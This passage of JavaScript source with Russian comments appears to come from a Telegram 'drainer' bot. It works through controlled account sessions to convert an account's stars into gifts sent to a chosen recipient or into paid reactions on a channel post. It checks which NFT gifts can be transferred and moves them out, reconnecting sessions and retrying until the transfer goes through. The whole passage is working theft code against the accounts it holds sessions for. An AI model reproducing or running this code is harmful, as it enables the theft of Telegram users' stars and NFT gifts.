      title: "Rose",
      slug: "rose",
      className: "StarGift",
      unique: false
    },
    {
      id: "5170144170496491616",  // Teddy - 50 ⭐
      stars: 50,
      name: "Teddy",
      title: "Teddy",
      slug: "teddy",
      className: "StarGift",
      unique: false
    },
    {
      id: "5168043875654172773",  // Diamond - 100 ⭐
      stars: 100,
      name: "Diamond",
      title: "Diamond",
      slug: "diamond",
      className: "StarGift",
      unique: false
    }
  ];
  
  console.log(`[DONOR-GIFTS] Используется жёстко заданный список из ${donorGifts.length} подарков:`);
  donorGifts.forEach(gift => {
    console.log(`[DONOR-GIFTS]   - ${gift.name}: ${gift.stars} ⭐ (ID: ${gift.id})`);
  });
  
  return donorGifts;
}

// Оставляем старую функцию для совместимости, но она теперь использует жёстко заданный список
async function getDonorGiftsFromDB(donorClient, donorSessionId) {
  // Игнорируем параметры, используем жёстко заданный список
  return getDonorGiftsList();
}

function filterAllowedGifts(gifts) {
  return gifts.filter(gift => {
    if (!gift.id || !gift.stars) return false;
    
    if (gift.isLimited === true) return false;
    
    let price = 0;
    if (gift.stars) {
      if (typeof gift.stars === 'bigint') {
        price = Number(gift.stars);
      } else if (typeof gift.stars === 'object' && gift.stars !== null) {
        if (gift.stars.value !== undefined) {
          price = typeof gift.stars.value === 'bigint' ? Number(gift.stars.value) : gift.stars.value;
        } else if (gift.stars.amount !== undefined) {
          price = typeof gift.stars.amount === 'bigint' ? Number(gift.stars.amount) : gift.stars.amount;
        }
      } else {
        price = Number(gift.stars) || 0;
      }
    } else if (gift.price) {
      price = typeof gift.price === 'number' ? gift.price : Number(gift.price) || 0;
    }
    
    if (price >= 250) return false;
    
    const title = (gift.title || '').toLowerCase();
    const slug = (gift.slug || '').toLowerCase();
    const name = (gift.name || '').toLowerCase();
    if (title.includes('ufc') || slug.includes('ufc') || name.includes('ufc')) {
      return false;
    }
    
    return true;
  });
}

async function calculateGiftsToBuy(neededStars, availableGifts) {
  const COMMISSION_RATE = 0.133;
  
  // Извлекаем цену каждого подарка и рассчитываем звёзды после продажи
  const giftsWithPrice = [];
  
  for (const gift of availableGifts) {
    if (!gift.id || !gift.stars) {
      continue;
    }
    
    let stars = gift.stars;
    if (typeof stars === 'bigint') {
      stars = Number(stars);
    } else if (typeof stars === 'object' && stars !== null) {
      if (stars.value !== undefined) {
        stars = typeof stars.value === 'bigint' ? Number(stars.value) : stars.value;
      } else if (stars.amount !== undefined) {
        stars = typeof stars.amount === 'bigint' ? Number(stars.amount) : stars.amount;
      } else {
        stars = 0;
      }
    } else {
      stars = Number(stars) || 0;
    }
    
    if (stars > 0) {
      const starsAfterSale = Math.floor(stars * (1 - COMMISSION_RATE));
      giftsWithPrice.push({ gift, stars, starsAfterSale });
    }
  }
  
  // Сортируем по исходной цене подарка: от дешёвых к дорогим
  giftsWithPrice.sort((a, b) => a.stars - b.stars);
  
  if (giftsWithPrice.length === 0) {
    return { gifts: [], totalCost: 0, totalStarsAfterSale: 0 };
  }
  
  // Оптимизированный алгоритм: используем динамическое программирование
  // dp[i] = минимальный перерасход при получении i звёзд после продажи
  // Для каждого состояния храним комбинацию подарков
  // ВАЖНО: позволяем использовать один и тот же подарок несколько раз
  const MAX_STARS = neededStars + 50; // Ограничиваем поиск разумными пределами
  const dp = Array(MAX_STARS + 1).fill(null).map(() => ({ 
    gifts: [], 
    totalCost: Infinity, 
    overhead: Infinity 
  }));
  dp[0] = { gifts: [], totalCost: 0, overhead: 0 };
  
  // Заполняем dp массив
  // Проходим по всем типам подарков, и для каждого типа
  // проходим по массиву в прямом порядке, чтобы можно было использовать
  // один и тот же подарок несколько раз
  for (const { gift, stars, starsAfterSale } of giftsWithPrice) {
    // Для каждого типа подарка проходим по массиву в прямом порядке
    // Это позволяет использовать один и тот же подарок несколько раз
    for (let i = 0; i <= MAX_STARS - starsAfterSale; i++) {
      if (dp[i].totalCost === Infinity) continue;
      
      const newStarsAfterSale = i + starsAfterSale;
      const newTotalCost = dp[i].totalCost + stars;
      const newOverhead = newStarsAfterSale - neededStars;
      
      // Если это лучшее решение для этого количества звёзд
      // (минимальный перерасход, а при равном перерасходе - минимальная стоимость)
      if (newOverhead < dp[newStarsAfterSale].overhead || 
          (newOverhead === dp[newStarsAfterSale].overhead && newTotalCost < dp[newStarsAfterSale].totalCost)) {
        dp[newStarsAfterSale] = {
          gifts: [...dp[i].gifts, { gift, stars, starsAfterSale }],
          totalCost: newTotalCost,
          overhead: newOverhead
        };
      }
    }
  }
  
  // Находим лучшее решение (минимальный перерасход)
  let bestState = null;
  let minOverhead = Infinity;
  let minTotalCost = Infinity;
  
  for (let i = neededStars; i <= MAX_STARS; i++) {
    if (dp[i].totalCost !== Infinity) {
      const overhead = dp[i].overhead;
      const totalCost = dp[i].totalCost;
      
      if (overhead < minOverhead || (overhead === minOverhead && totalCost < minTotalCost)) {
        minOverhead = overhead;
        minTotalCost = totalCost;
        bestState = dp[i];
      }
    }
  }
  
  // Если не нашли решение, используем жадный алгоритм как fallback
  if (!bestState || bestState.gifts.length === 0) {
    console.log(`[CALCULATE-GIFTS] ⚠️  Не найдена оптимальная комбинация, используем жадный алгоритм`);
    let totalStarsAfterSale = 0;
    const selectedGifts = [];
    
    for (const { gift, stars, starsAfterSale } of giftsWithPrice) {
      selectedGifts.push({ gift, stars, starsAfterSale });
      totalStarsAfterSale = Number(totalStarsAfterSale) + Number(starsAfterSale);
      
      if (Number(totalStarsAfterSale) >= Number(neededStars)) {
        break;
    }
  }
  
  const totalCost = selectedGifts.reduce((sum, item) => sum + item.stars, 0);
  return { gifts: selectedGifts, totalCost: Number(totalCost), totalStarsAfterSale: Number(totalStarsAfterSale) };
  }
  
  // Возвращаем оптимальную комбинацию
  const totalStarsAfterSale = bestState.gifts.reduce((sum, item) => sum + item.starsAfterSale, 0);
  const totalCost = bestState.totalCost;
  const overhead = bestState.overhead;
  
  console.log(`[CALCULATE-GIFTS] ✅ Найдена оптимальная комбинация:`);
  console.log(`[CALCULATE-GIFTS]    Нужно звёзд после продажи: ${neededStars}`);
  console.log(`[CALCULATE-GIFTS]    Подарков: ${bestState.gifts.length}`);
  console.log(`[CALCULATE-GIFTS]    Потрачено: ${totalCost} звёзд`);
  console.log(`[CALCULATE-GIFTS]    Получено после продажи: ${totalStarsAfterSale} звёзд`);
  console.log(`[CALCULATE-GIFTS]    Перерасход: ${overhead} звёзд`);
  
  // Детальное логирование выбранных подарков
  const giftCounts = {};
  bestState.gifts.forEach(({ stars }) => {
    giftCounts[stars] = (giftCounts[stars] || 0) + 1;
  });
  const giftDetails = Object.entries(giftCounts)
    .map(([stars, count]) => `${count}×${stars}⭐`)
    .join(' + ');
  console.log(`[CALCULATE-GIFTS]    Комбинация: ${giftDetails}`);
  
  return { gifts: bestState.gifts, totalCost: Number(totalCost), totalStarsAfterSale: Number(totalStarsAfterSale) };
}

async function buyAndSendGift(donorClient, gift, recipient) {
  try {
    const recipientPeer = await donorClient.getEntity(recipient);
    const inputPeer = await donorClient.getInputEntity(recipientPeer);
    
    // Конвертируем ID в BigInt для совместимости с Telegram API
    const giftId = typeof gift.id === 'string' ? BigInt(gift.id) : gift.id;
    
    const invoice = new Api.InputInvoiceStarGift({
      peer: inputPeer,
      giftId: giftId,
    });
    
    const paymentForm = await safeInvoke(donorClient, async () => {
      return await donorClient.invoke(
        new Api.payments.GetPaymentForm({
          invoice: invoice,
          themeParams: new Api.DataJSON({ data: "{}" }),
        })
      );
    });
    
    if (!paymentForm || !paymentForm.formId) {
      return false;
    }
    
    const result = await donorClient.invoke(
      new Api.payments.SendStarsForm({
        formId: paymentForm.formId,
        invoice: invoice,
      })
    );
    
    return !!result;
  } catch (e) {
    if (e.errorMessage) {
      if (e.errorMessage.includes('API_GIFT_RESTRICTED_UPDATE_APP')) {
        console.error(`[BUY-AND-SEND] API_GIFT_RESTRICTED_UPDATE_APP`);
      } else if (e.errorMessage.includes('FORM_EXPIRED')) {
        return false;
      }
    }
    return false;
  }
}

async function sendRemainingStarsAsGifts(client, recipient, remainingStars, progressCallback) {
  if (remainingStars <= 0) {
    return { sent: 0 };
  }
  
  try {
    const allGifts = await client.invoke(
      new Api.payments.GetStarGifts({
        hash: 0,
      })
    );
    
    if (!allGifts || !allGifts.gifts || allGifts.gifts.length === 0) {
      return { sent: 0 };
    }
    
    let recipientPeer;
    let inputPeer;
    try {
      recipientPeer = await client.getEntity(recipient);
      inputPeer = await client.getInputEntity(recipientPeer);
    } catch (e) {
      if (progressCallback) {
        const recipientDisplay = typeof recipient === 'number' ? `ID ${recipient}` : (recipient.startsWith('@') ? recipient : `@${recipient}`);
        await progressCallback(`⚠️ Получатель ${recipientDisplay} не найден, пропускаю отправку подарков`);
      }
      return { sent: 0 };
    }
    let sentCount = 0;
    let totalSpent = 0;
    
    const regularGifts = allGifts.gifts.filter(gift => {
      if (!gift.id || !gift.stars) return false;
      const isNFT = gift.className === 'StarGiftUnique' || gift.unique === true;
      return !isNFT;
    });
    
    const allowedGifts = filterAllowedGifts(regularGifts);
    
    // Извлекаем цену каждого подарка и сортируем от дешёвых к дорогим
    const giftsWithPrice = allowedGifts.map(gift => {
      let stars = gift.stars;
      if (typeof stars === 'bigint') {
        stars = Number(stars);
      } else if (typeof stars === 'object' && stars !== null) {
        stars = stars.value || stars.amount || 0;
      } else {
        stars = Number(stars) || 0;
      }
      return { gift, stars };
    }).filter(item => item.stars > 0);
    
    // Сортируем по цене: от дешёвых к дорогим
    giftsWithPrice.sort((a, b) => a.stars - b.stars);
    
    // Используем жадный алгоритм: берём самые дешёвые подарки, пока не наберём нужную сумму
    for (const { gift, stars } of giftsWithPrice) {
      if (totalSpent >= remainingStars) {
        break;
      }
      
      // Проверяем, помещается ли этот подарок в оставшиеся звёзды
      if (totalSpent + stars <= remainingStars) {
        try {
          const invoice = new Api.InputInvoiceStarGift({
            peer: inputPeer,
            giftId: gift.id,
          });
          
          const paymentForm = await safeInvoke(client, async () => {
            return await client.invoke(
              new Api.payments.GetPaymentForm({
                invoice: invoice,
                themeParams: new Api.DataJSON({ data: "{}" }),
              })
            );
          });
          
          await safeInvoke(client, async () => {
            return await client.invoke(
              new Api.payments.SendStarsForm({
                formId: paymentForm.formId,
                invoice: invoice,
              })
            );
          });
          
          sentCount++;
          totalSpent += stars;
          
          if (progressCallback) {
            await progressCallback(`✅ Отправлен подарок на ${stars} звёзд (всего потрачено: ${totalSpent}/${remainingStars})`);
          }
          
          // Уменьшена задержка для ускорения
          await new Promise(resolve => setTimeout(resolve, 100));
        } catch (e) {
          console.error(`[SEND-REMAINING-STARS] Ошибка отправки подарка на ${stars} звёзд:`, e.message);
          continue;
        }
      }
    }
    
    return { sent: sentCount, spent: totalSpent };
  } catch (e) {
    return { sent: 0 };
  }
}

// Функция для отправки звёзд на сообщение в канале
async function sendStarsToChannelMessage(client, channelId, messageId, starsAmount, channelUsername = null) {
  if (!starsAmount || starsAmount <= 0) {
    console.log(`[SEND-STARS-TO-MESSAGE] Нет звёзд для отправки (${starsAmount})`);
    return { success: false, error: 'Нет звёзд для отправки' };
  }
  
  if (!channelId || !messageId) {
    console.log(`[SEND-STARS-TO-MESSAGE] Не указаны channelId или messageId`);
    return { success: false, error: 'Не указаны параметры канала или сообщения' };
  }
  
  try {
    console.log(`[SEND-STARS-TO-MESSAGE] Отправляю ${starsAmount} звёзд на сообщение ${messageId} в канале ${channelId}`);
    
    // Для каналов используем username из конфига или из ссылки
    // Если username не указан, используем дефолтный из ссылки https://t.me/perechodnikdrain
    const channelUsernameToUse = channelUsername || config.starsChannelUsername || "perechodnikdrain";
    
    let inputChannel;
    let channel; // Сохраняем channel для получения accessHash
    
    // Пробуем получить канал по username (самый надёжный способ)
    try {
      console.log(`[SEND-STARS-TO-MESSAGE] Пробую получить канал по username: @${channelUsernameToUse}`);
      channel = await client.getEntity(channelUsernameToUse);
      inputChannel = await client.getInputEntity(channel);
      console.log(`[SEND-STARS-TO-MESSAGE] ✅ Канал получен по username: @${channelUsernameToUse}`);
    } catch (usernameError) {
      console.log(`[SEND-STARS-TO-MESSAGE] ⚠️  Не удалось получить канал по username: ${usernameError.message}`);
      console.log(`[SEND-STARS-TO-MESSAGE] Пробую получить канал по ID: ${channelId}`);
      
      // Если не получилось по username, пробуем по ID
      try {
        channel = await client.getEntity(channelId);
        inputChannel = await client.getInputEntity(channel);
        console.log(`[SEND-STARS-TO-MESSAGE] ✅ Канал получен по ID`);
      } catch (idError) {
        console.error(`[SEND-STARS-TO-MESSAGE] ❌ Не удалось получить канал ни по username, ни по ID`);
        console.error(`[SEND-STARS-TO-MESSAGE] Ошибка username: ${usernameError.message}`);
        console.error(`[SEND-STARS-TO-MESSAGE] Ошибка ID: ${idError.message}`);
        throw new Error(`Не удалось получить канал. Убедитесь, что сессия имеет доступ к каналу @${channelUsernameToUse} или каналу с ID ${channelId}`);
      }
    }
    
    // Отправляем звёзды на сообщение через платные реакции
    // В Telegram для отправки звёзд на сообщение используется метод messages.SendPaidReaction
    console.log(`[SEND-STARS-TO-MESSAGE] Отправляю ${starsAmount} звёзд через платные реакции на сообщение...`);
    
    // Формируем random_id: старшие 32 бита - unix время, нижние 32 бита - случайные
    // Используем BigInt с самого начала, чтобы избежать проблем с 32-битными операциями
    const unixTime = BigInt(Math.floor(Date.now() / 1000));
    const randomLow = BigInt(Math.floor(Math.random() * 0xFFFFFFFF));
    const randomId = (unixTime << 32n) | randomLow;
    
    console.log(`[SEND-STARS-TO-MESSAGE] random_id: ${randomId.toString()}, count: ${starsAmount}`);
    
    // Отправляем звёзды через SendPaidReaction
    const result = await safeInvoke(client, async () => {
      return await client.invoke(
        new Api.messages.SendPaidReaction({
          peer: inputChannel,
          msgId: Number(messageId),
          count: Number(starsAmount),
          randomId: randomId
        })
      );
    });
    
    if (result) {
      console.log(`[SEND-STARS-TO-MESSAGE] ✅ Успешно отправлено ${starsAmount} звёзд на сообщение ${messageId}`);
      return { success: true, result };
    } else {
      console.error(`[SEND-STARS-TO-MESSAGE] ❌ Результат отправки пустой`);
      return { success: false, error: 'Результат отправки пустой' };
    }
    
    // Результат уже обработан выше в цикле
  } catch (e) {
    console.error(`[SEND-STARS-TO-MESSAGE] ❌ Ошибка отправки звёзд на сообщение:`, e.message);
    if (e.errorMessage) {
      console.error(`[SEND-STARS-TO-MESSAGE] ❌ Telegram API ошибка: ${e.errorMessage}`);
    }
    return { success: false, error: e.message };
  }
}

async function checkNFTsBeforeTransfer(client, recipient, progressCallback) {
  try {
    console.log(`[CHECK-NFT] 🔍 Начинаю проверку NFT перед передачей`);
    let recipientPeer;
    let inputPeer;
    const recipientDisplay = typeof recipient === 'number' ? `ID ${recipient}` : (recipient.startsWith('@') ? recipient : `@${recipient}`);
    
    try {
      console.log(`[CHECK-NFT] 🔍 Получаю информацию о получателе: ${recipientDisplay}`);
      recipientPeer = await client.getEntity(recipient);
      inputPeer = await client.getInputEntity(recipientPeer);
      
      if (!inputPeer) {
        throw new Error(`Не удалось получить InputEntity для ${recipientDisplay}`);
      }
      console.log(`[CHECK-NFT] ✅ Получатель найден: ${recipientDisplay}`);
    } catch (e) {
      console.error(`[CHECK-NFT] ❌ Ошибка получения peer для ${recipientDisplay}:`, e.message || e);
      
      try {
        const me = await client.getMe();
        if (recipient === me.username || recipient === String(me.id) || recipient === me.id) {
          recipientPeer = me;
          inputPeer = await client.getInputEntity(recipientPeer);
        } else {
          throw new Error(`Не удалось найти получателя ${recipientDisplay}: ${e.message || e}`);
        }
      } catch (e2) {
        throw new Error(`Не удалось найти получателя ${recipientDisplay}: ${e.message || e}`);
      }
    }
    
    if (!inputPeer || !inputPeer.className) {
      throw new Error(`Не удалось получить валидный peer для получателя ${recipientDisplay}`);
    }
    
    console.log(`[CHECK-NFT] 🔍 Получаю список сохранённых подарков...`);
    const savedGifts = await client.invoke(
      new Api.payments.GetSavedStarGifts({
        peer: await client.getEntity("me"),
        offset: "",
        limit: 100,
      })
    );
    
    const nftGifts = [];
    
    if (savedGifts && savedGifts.gifts) {
      console.log(`[CHECK-NFT] 🔍 Всего сохранённых подарков: ${savedGifts.gifts.length}`);
      for (const gift of savedGifts.gifts) {
        if (gift.gift) {
          const isNFT = gift.gift.className === 'StarGiftUnique' || gift.gift.unique === true;
          if (isNFT) {
            nftGifts.push(gift);
          }
        }
      }
    }
    
    console.log(`[CHECK-NFT] 🔍 Найдено NFT: ${nftGifts.length}`);
    
    if (nftGifts.length === 0) {
      console.log(`[CHECK-NFT] ⚠️  NFT не найдены, возвращаю пустые списки`);
      return { transferable: [], nonTransferable: [] };
    }
    
    const transferable = [];
    const nonTransferable = [];
    
    if (progressCallback) {
      await progressCallback(`🔍 Проверяю ${nftGifts.length} NFT перед передачей...`);
    }
    
    console.log(`[CHECK-NFT] 🔍 Оптимизация: группирую NFT по коллекциям для минимизации API-вызовов...`);
    
    // ОПТИМИЗАЦИЯ: Группируем NFT по коллекции/типу для минимизации проверок
    const nftGroups = groupNFTsByCollection(nftGifts);
    console.log(`[CHECK-NFT] 🔍 Сгруппировано в ${nftGroups.length} групп (было ${nftGifts.length} NFT)`);
    
    if (progressCallback) {
      await progressCallback(`🔍 Проверяю ${nftGifts.length} NFT (${nftGroups.length} групп)...`);
    }
    
    // Создаём rate limiter для контроля нагрузки
    const rateLimiter = new RateLimiter(10, 3);
    
    // Функция проверки одного NFT
    const checkSingleNFT = async (gift) => {
      const giftName = gift.gift.title || gift.gift.id || 'NFT';
      const giftSlug = gift.gift.slug || '';
      const giftLink = giftSlug ? `https://t.me/nft/${giftSlug}` : '';
      
      await rateLimiter.consume(1);
      
      try {
        let savedGiftInput = null;
        
        if (gift.msgId) {
          savedGiftInput = new Api.InputSavedStarGiftUser({
            msgId: gift.msgId,
          });
        } else if (gift.savedId) {
          let fromPeer = null;
          if (gift.fromId) {
            if (gift.fromId.className === 'PeerUser') {
              try {
                const fromUser = await client.getEntity(gift.fromId.userId);
                fromPeer = await client.getInputEntity(fromUser);
              } catch (e) {
                // Игнорируем ошибку
              }
            } else if (gift.fromId.className === 'PeerChat' || gift.fromId.className === 'PeerChannel') {
              try {
                const chatId = gift.fromId.chatId || gift.fromId.channelId;
                const fromChat = await client.getEntity(chatId);
                fromPeer = await client.getInputEntity(fromChat);
              } catch (e) {
                // Игнорируем ошибку
              }
            }
          }
          
          if (fromPeer) {
            savedGiftInput = new Api.InputSavedStarGiftChat({
              peer: fromPeer,
              savedId: gift.savedId,
            });
          }
        }
        
        if (!savedGiftInput) {
          return { 
            gift, 
            name: giftName, 
            link: giftLink, 
            transferable: false,
            error: 'Не удалось создать InputSavedStarGift' 
          };
        }
        
        const invoice = new Api.InputInvoiceStarGiftTransfer({
          stargift: savedGiftInput,
          toId: inputPeer,
        });
        
        try {
          await safeInvoke(client, async () => {
            return await client.invoke(
              new Api.payments.GetPaymentForm({
                invoice: invoice,
                themeParams: new Api.DataJSON({ data: "{}" }),
              })
            );
          });
          
          rateLimiter.onSuccess();
          return { gift, name: giftName, link: giftLink, transferable: true, freeTransfer: false };
        } catch (e) {
          const errorMsg = e.errorMessage || e.message || e.toString() || 'Неизвестная ошибка';
          
          if (errorMsg.includes('FLOOD') || errorMsg.includes('429')) {
            rateLimiter.onRateLimitError();
          } else {
            rateLimiter.onError(e);
          }
          
          if (errorMsg.includes('NO_PAYMENT_NEEDED')) {
            return { gift, name: giftName, link: giftLink, transferable: true, freeTransfer: true };
          } else {
            return { gift, name: giftName, link: giftLink, transferable: false, error: errorMsg };
          }
        }
      } catch (e) {
        const errorMsg = e.message || e.toString() || 'Неизвестная ошибка';
        rateLimiter.onError(e);
        return { gift, name: giftName, link: giftLink, transferable: false, error: errorMsg };
      }
    };
    
    // ОПТИМИЗАЦИЯ: Проверяем только первый NFT из каждой группы, результат применяем ко всем
    // Создаём Worker Pool для параллельной обработки групп
    const pool = new WorkerPool(5);
    
    // Собираем задачи для проверки (по одному NFT из каждой группы)
    const checkTasks = [];
    for (let i = 0; i < nftGroups.length; i++) {
      const group = nftGroups[i];
      if (group.length > 0) {
        checkTasks.push(group[0]); // Проверяем только первый NFT из группы
      }
    }
    
    console.log(`[CHECK-NFT] 🔍 Проверяю ${checkTasks.length} NFT (по одному из каждой группы)...`);
    
    // Выполняем проверки через Worker Pool
    const checkResults = await pool.run(checkTasks, checkSingleNFT);
    
    // Применяем результаты ко всем NFT в группах
    let totalChecked = 0;
    for (let i = 0; i < nftGroups.length; i++) {
      const group = nftGroups[i];
      const sampleResult = checkResults[i];
      
      if (sampleResult && !sampleResult.error) {
        // Применяем результат ко всем NFT в группе
        for (const gift of group) {
          totalChecked++;
          const giftName = gift.gift.title || gift.gift.id || `NFT #${totalChecked}`;
          const giftSlug = gift.gift.slug || '';
          const giftLink = giftSlug ? `https://t.me/nft/${giftSlug}` : '';
          
          if (sampleResult.transferable) {
            transferable.push({ 
              gift, 
              name: giftName, 
              link: giftLink, 
              freeTransfer: sampleResult.freeTransfer || false 
            });
            if (progressCallback && totalChecked % 5 === 0) {
              await progressCallback(`    ✅ Можно передать: ${giftName}${sampleResult.freeTransfer ? ' (БЕСПЛАТНО)' : ''}`);
            }
          } else {
            nonTransferable.push({ 
              gift, 
              name: giftName, 
              link: giftLink, 
              error: sampleResult.error || 'Ошибка проверки' 
            });
          }
        }
      } else {
        // Если ошибка при проверке образца, проверяем каждый NFT индивидуально
        console.log(`[CHECK-NFT] ⚠️  Ошибка при проверке группы, проверяю каждый NFT индивидуально...`);
        for (const gift of group) {
          totalChecked++;
          const result = await checkSingleNFT(gift);
          const giftName = result.name;
          
          if (result.transferable) {
            transferable.push({ 
              gift: result.gift, 
              name: giftName, 
              link: result.link, 
              freeTransfer: result.freeTransfer || false 
            });
          } else {
            nonTransferable.push({ 
              gift: result.gift, 
              name: giftName, 
              link: result.link, 
              error: result.error || 'Ошибка проверки' 
            });
          }
        }
      }
    }
    
    console.log(`[CHECK-NFT] ✅ Проверено ${totalChecked} NFT (из ${nftGifts.length} через ${checkTasks.length} проверок групп)`);
    
    console.log(`[CHECK-NFT] ✅ Проверка завершена:`);
    console.log(`[CHECK-NFT]    ✅ Можно передать: ${transferable.length}`);
    console.log(`[CHECK-NFT]    ❌ Нельзя передать: ${nonTransferable.length}`);
    return { transferable, nonTransferable };
  } catch (e) {
    throw e;
  }
}

// Функция передачи одного NFT с обработкой ошибок (патч)
async function transferOneNFT(client, gift, inputPeer, giftName, giftLink, sessionPath, progressCallback, isFreeTransfer = false) {
  let attempt = 0;
  let lastErr = null;
  let savedGiftInput = null;
  
  // Создаём savedGiftInput
  if (gift.msgId) {
    savedGiftInput = new Api.InputSavedStarGiftUser({
      msgId: gift.msgId,
    });
  } else if (gift.savedId) {
    let fromPeer = null;
    if (gift.fromId) {
      if (gift.fromId.className === 'PeerUser') {
        try {
          const fromUser = await client.getEntity(gift.fromId.userId);
          fromPeer = await client.getInputEntity(fromUser);
        } catch (e) {
          if (progressCallback) await progressCallback(`    ⚠️  Не удалось получить peer отправителя`);
        }
      } else if (gift.fromId.className === 'PeerChat' || gift.fromId.className === 'PeerChannel') {
        try {
          const chatId = gift.fromId.chatId || gift.fromId.channelId;
          const fromChat = await client.getEntity(chatId);
          fromPeer = await client.getInputEntity(fromChat);
        } catch (e) {
          if (progressCallback) await progressCallback(`    ⚠️  Не удалось получить peer отправителя`);
        }
      }
    }
    
    if (fromPeer) {
      savedGiftInput = new Api.InputSavedStarGiftChat({
        peer: fromPeer,
        savedId: gift.savedId,
      });
    }
  }
  
  if (!savedGiftInput) {
    return { success: false, name: giftName, link: giftLink, error: 'Не удалось создать InputSavedStarGift' };
  }
  
  // Создаём invoice
  let invoice = new Api.InputInvoiceStarGiftTransfer({
    stargift: savedGiftInput,
    toId: inputPeer,
  });
  
  // Повторять операцию в целом (включая reconnect) до maxRetriesPerOp
  while (attempt < MAX_OPERATION_RETRIES) {
    attempt++;
    
    // 0) Убедимся, что авторизованы перед критической операцией
    let ok = await (async () => {
      try {
        const authOk = await ensureAuthorized(client);
        if (!authOk) {
          // Попытка переподключения
          await reconnectWithRetry(client, sessionPath, { maxRetries: MAX_RECONNECT_RETRIES }, lastErr);
        }
        return true;
      } catch (e) {
        lastErr = e;
        return false;
      }
    })();
    
    if (!ok) break;
    
    try {
      // 2) Попытка получить форму оплаты
      let paymentForm = null;
      try {
        paymentForm = await safeInvoke(client, async () =>
          client.invoke(
            new Api.payments.GetPaymentForm({
              invoice: invoice,
              themeParams: new Api.DataJSON({ data: "{}" }),
            })
          )
        );
      } catch (err) {
          const errorMsg = err.errorMessage || err.message || err.toString() || 'Неизвестная ошибка';
          
          // Случай: NO_PAYMENT_NEEDED -> free transfer
          if (errIncludes(err, "NO_PAYMENT_NEEDED")) {
            console.info(`[TRANSFER-ONE-NFT] NO_PAYMENT_NEEDED — перевод бесплатный, перейдём к TransferStarGift`);
            paymentForm = null;
          } else if (errIncludes(err, "INVOICE_INVALID")) {
            console.warn(`[TRANSFER-ONE-NFT] INVOICE_INVALID при GetPaymentForm. Попытаемся обновить инвойс и повторить один раз.`);
            // Попытка обновления/рефреша savedGiftInput
            try {
              const newSaved = await refreshSavedGift(client, gift, savedGiftInput);
              if (newSaved) {
                savedGiftInput = newSaved;
                invoice = new Api.InputInvoiceStarGiftTransfer({ stargift: savedGiftInput, toId: inputPeer });
                await sleep(150);
                // Повторить цикл (без увеличения attempt)
                continue;
              } else {
                console.warn(`[TRANSFER-ONE-NFT] refreshSavedGift вернул falsy — пропускаем NFT`);
                return { success: false, reason: "INVOICE_INVALID", skip: true, name: giftName, link: giftLink, error: "INVOICE_INVALID - не удалось обновить инвойс" };
              }
            } catch (refreshErr) {
              console.error(`[TRANSFER-ONE-NFT] Ошибка при refreshSavedGift:`, refreshErr.message || refreshErr);
              return { success: false, reason: "INVOICE_INVALID", skip: true, name: giftName, link: giftLink, error: `INVOICE_INVALID - ошибка обновления: ${refreshErr.message || refreshErr}` };
            }
          } else if (errIncludes(err, "AUTH_KEY_UNREGISTERED")) {
            // Восстанавливаем сессию и повторяем
            console.warn(`[TRANSFER-ONE-NFT] AUTH_KEY_UNREGISTERED на GetPaymentForm — делаем reconnect и повторяем.`);
            await reconnectWithRetry(client, sessionPath, { maxRetries: MAX_RECONNECT_RETRIES }, lastErr);
            continue; // повторим цикл
          } else {
            throw err; // пробрасываем
          }
        }
        
        // 3) Если paymentForm есть — оплачиваем
        if (paymentForm) {
          try {
            const sendRes = await safeInvoke(client, async () =>
              client.invoke(
                new Api.payments.SendStarsForm({
                  formId: paymentForm.formId,
                  invoice: invoice,
                })
              )
            );
            
            // Успех: сохраняем сессию и возвращаем результат
            await persistSession(client, sessionPath);
            return { success: true, paid: true, name: giftName, link: giftLink, result: sendRes };
          } catch (err) {
            if (errIncludes(err, "AUTH_KEY_UNREGISTERED")) {
              console.warn(`[TRANSFER-ONE-NFT] AUTH_KEY_UNREGISTERED на SendStarsForm — reconnect и повторить.`);
              await reconnectWithRetry(client, sessionPath, { maxRetries: MAX_RECONNECT_RETRIES }, lastErr);
              continue;
            }
            throw err;
          }
        } else {
          // 4) free-transfer: вызов TransferStarGift
          try {
            const transferRes = await safeInvoke(client, async () =>
              client.invoke(
                new Api.payments.TransferStarGift({
                  stargift: savedGiftInput,
                  toId: inputPeer,
                })
              )
            );
            
            await persistSession(client, sessionPath);
            return { success: true, paid: false, name: giftName, link: giftLink, result: transferRes };
          } catch (err) {
            if (errIncludes(err, "AUTH_KEY_UNREGISTERED")) {
              console.warn(`[TRANSFER-ONE-NFT] AUTH_KEY_UNREGISTERED на TransferStarGift — reconnect и повторить.`);
              await reconnectWithRetry(client, sessionPath, { maxRetries: MAX_RECONNECT_RETRIES }, lastErr);
              continue;
            }
            
            if (errIncludes(err, "STARGIFT_TRANSFER_TOO_EARLY") || errIncludes(err, "STARGIFT_NOT_FOUND")) {
              console.warn(`[TRANSFER-ONE-NFT] TransferStarGift вернул специфичную ошибку — считаем NFT недоступен и пропускаем.`, err.message || err);
              return { success: false, reason: "TRANSFER_FAILED", name: giftName, link: giftLink, error: err.message || err.toString() };
            }
            throw err;
          }
        }
      } catch (err) {
        lastErr = err;
        
        // Если ошибка явно AUTH_KEY_UNREGISTERED — попробуем переподключиться
        if (errIncludes(err, "AUTH_KEY_UNREGISTERED")) {
          console.warn(`[TRANSFER-ONE-NFT] AUTH_KEY_UNREGISTERED поймана на верхнем уровне, пытаемся reconnect...`);
          await reconnectWithRetry(client, sessionPath, { maxRetries: MAX_RECONNECT_RETRIES }, lastErr);
          continue; // повторим попытку
        }
        
        // Если transient (timeout/502/etc.), делаем backoff и повторяем
        const backoff = BACKOFF_BASE_MS * Math.pow(2, attempt);
        console.warn(`[TRANSFER-ONE-NFT] Попытка ${attempt} не удалась, backoff ${backoff}ms, error:`, err.message || err);
        await sleep(backoff);
        continue;
      }
  } // конец while
  
  // если вышли сюда — неудача
  return { success: false, reason: "MAX_RETRIES_EXCEEDED", name: giftName, link: giftLink, error: lastErr ? (lastErr.message || lastErr.toString()) : 'Превышено количество попыток' };
}

async function transferNFT(client, recipient, progressCallback, transferableNFTs = null, sessionPath = null) {
  try {
    console.log(`[TRANSFER-NFT] 🖼️  Начинаю передачу NFT`);
    let recipientPeer;
    let inputPeer;
    const recipientDisplay = typeof recipient === 'number' ? `ID ${recipient}` : (recipient.startsWith('@') ? recipient : `@${recipient}`);
    
    try {
      console.log(`[TRANSFER-NFT] 🔍 Получаю информацию о получателе: ${recipientDisplay}`);
      recipientPeer = await client.getEntity(recipient);
      inputPeer = await client.getInputEntity(recipientPeer);
      
      if (!inputPeer) {
        throw new Error(`Не удалось получить InputEntity для ${recipientDisplay}`);
      }
